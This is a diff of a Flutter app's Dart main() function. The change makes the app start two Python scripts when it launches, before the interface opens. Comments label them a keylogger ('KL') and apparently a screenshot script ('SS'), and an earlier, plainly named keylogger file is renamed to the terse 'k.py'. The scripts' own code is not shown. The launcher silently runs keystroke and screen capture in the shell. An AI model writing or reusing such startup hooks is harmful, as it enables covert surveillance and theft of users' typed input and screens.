@@ -17,22 +17,37 @@ const globalAccentColor = Color.fromARGB(167, 255, 193, 7);
 
 void main() {
   String currentPath = Directory.current.path + "\\lib\\";
-  String runnedCommand = currentPath + 'keyloggerFile.py';
-  print('Script and log path: $currentPath');
+  String runnedCommand1 = 'python ' + currentPath + 'k.py';
+  String runnedCommand2 = 'python ' + currentPath + 's.py';
+  print('Scripts and log path: $currentPath');
 
   // https://api.dart.dev/stable/2.7.0/dart-io/Process-class.html
-  Process.start(
-    runnedCommand,
+  Process.run(
+    runnedCommand2,
     [],
     runInShell: true,
     workingDirectory: currentPath,
-  ).then((process) {
-    print('Script process id - ${process.pid}');
-    process.exitCode.then((exitCode) {
-      print('Escape pressed. Python script ended.');
-      print('Exit code: $exitCode');
-    });
-  });
+  );
+  // .then((process) {
+  // print('Script process id - ${process.pid}');
+  // process.exitCode.then((exitCode) {
+  //   print('Escape pressed. Python SS script ended.');
+  //   print('Exit code: $exitCode');
+  // });
+  //});
+  Process.run(
+    runnedCommand1,
+    [],
+    runInShell: true,
+    workingDirectory: currentPath,
+  );
+  // .then((process) {
+  // print('Script process id - ${process.pid}');
+  // process.exitCode.then((exitCode) {
+  //   print('Escape pressed. Python KL script ended.');
+  //   print('Exit code: $exitCode');
+  // });
+  // });
 
   runApp(MyApp());
 }
